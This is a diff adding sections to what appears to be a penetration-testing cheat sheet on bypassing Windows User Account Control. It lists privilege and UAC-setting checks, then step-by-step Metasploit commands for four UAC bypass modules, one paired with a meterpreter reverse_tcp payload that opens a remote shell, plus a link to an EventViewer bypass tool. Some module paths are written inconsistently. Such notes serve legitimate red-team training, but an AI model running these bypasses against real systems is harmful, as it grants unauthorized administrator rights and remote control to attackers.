@@ -20,6 +20,50 @@
 
 ### Elevated Token = Full admin privileges. High IL.
 
+# Verify Privileges and UAC Configurations
+
+### 1) Privileges
+
+     whoami /priv
+
+### 2) UAC Configuration (Should be REG_DWORD 0x5)
+
+     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+
+# Metasploit
+
+### 1) bypassuac_fodhelper
+
+     use exploit/windows/local/bypassuacfodhelper
+     set session NUM
+     run
+     getprivs
+
+### 2) bypassuac_injection_winsxs
+
+     use windows/local/bypassuac_injection_winsxs
+     set session NUM
+     set target NUM
+     set payload windows/x64/meterpreter/reverse_tcp
+     run
+     getprivs
+
+### 3) bypassuac_sdclt
+
+     use exploit/windows/local/bypassuacsdclt
+     set session NUM
+     run
+     getprivs
+
+### 4) bypassuac_silentcleanup
+
+     use exploit/windows/local/bypassuac_silentcleanup
+     set session 2
+     run
+     getprivs
+
+
+
 # EventViewer
 
 Link: https://github.com/CsEnox/EventViewer-UACBypass
